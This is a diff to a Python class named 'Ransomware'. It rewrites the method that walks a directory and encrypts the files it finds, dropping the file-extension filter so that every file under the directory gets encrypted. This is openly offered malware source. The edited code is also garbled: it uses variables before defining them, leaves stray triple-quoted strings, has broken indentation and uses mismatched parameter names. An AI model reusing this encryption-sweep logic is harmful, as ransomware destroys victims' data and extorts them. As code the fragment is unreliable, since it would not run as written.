@@ -66,18 +66,27 @@ class Ransomware:
             tmp_dir:str: Absolute path of top level directory
             encrypt:bool: Specify whether to encrypt or decrypt encountered files
         """
-
+        
+        """
         for tmp, _, files in os.walk(tmp_dir):
             for f in files:
                 abs_file_path = os.path.join(tmp, f)
+        """
 
 
             # if not a file extension target
                 
+        for tmp, _, files in os.walk(tmp_dir):
+            if os.path.isfile(os.path.join(tmp, f)):
+                self.crypt_file(abs_file_path, encrypted=encrypted)
+            continue
+
+                """
                 if not abs_file_path.split('.')[-1] : #in self.file_ext_targets
                     continue 
                 
                 self.crypt_file(abs_file_path, encrypted=encrypted)
+                """
 
 
 
